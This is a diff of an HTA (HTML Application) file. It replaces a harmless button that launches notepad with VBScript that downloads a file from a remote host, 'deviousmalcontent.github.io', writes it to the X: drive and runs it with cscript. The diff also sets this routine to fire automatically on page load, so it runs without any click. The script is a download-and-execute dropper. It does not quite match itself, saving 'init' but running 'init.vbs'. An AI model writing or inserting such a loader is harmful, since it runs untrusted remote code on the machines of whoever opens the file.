@@ -10,17 +10,49 @@
     SYSMENU="yes"
     SCROLL="yes"
     WINDOWSTATE="normal">
-	<META HTTP-EQUIV="MSThemeCompatible" CONTENT="YES">
+    <META HTTP-EQUIV="MSThemeCompatible" CONTENT="YES">
 </head>
 <script language="VBScript"> 
+Set objFSO = Createobject("Scripting.FileSystemObject")
+Set objShell = wscript.createobject("wscript.shell")
+Set objHttp = CreateObject("WinHttp.WinHttpRequest.5.1" )
     Sub RunProgram 
-        Set objShell = CreateObject("Wscript.Shell")
-        objShell.Run "notepad.exe"
+        If FileExists(objShell.CurrentDirectory & "\init.vbs") Then
+           objShell.Run "cscript X:\init.vbs"
+           self.close
+        Else
+           strLink = "http://deviousmalcontent.github.io/ldvwpe/init"
+           strSaveName = Mid(strLink, InStrRev(strLink,"/") + 1, Len(strLink))
+           strSaveTo = "X:\" & strSaveName
+           objHttp.Open "GET", strLink, False
+           objHttp.Send
+
+           If objFSO.FileExists(strSaveTo) Then
+              objFSO.DeleteFile(strSaveTo)
+           End If
+
+           If objHTTP.Status = 200 Then
+               Dim objStream
+               Set objStream = CreateObject("ADODB.Stream")
+               With objStream
+                   .Type = 1
+                   .Open
+                   .Write objHTTP.ResponseBody
+                   .SaveToFile strSaveTo
+                   .Close
+               End With
+               set objStream = Nothing
+             End If
+
+             If objFSO.FileExists(strSaveTo) Then
+               objShell.Run "cscript X:\init.vbs"
+               self.close
+             End If      
+        End If
     End Sub
 </script> 
 </head> 
-
-<body> 
-<button onclick="RunProgram">Run Program</button> <p>
+<body onload="RunProgram"> 
+<p><button onclick="RunProgram">Run Program</button></p>
 </body> 
 </html>
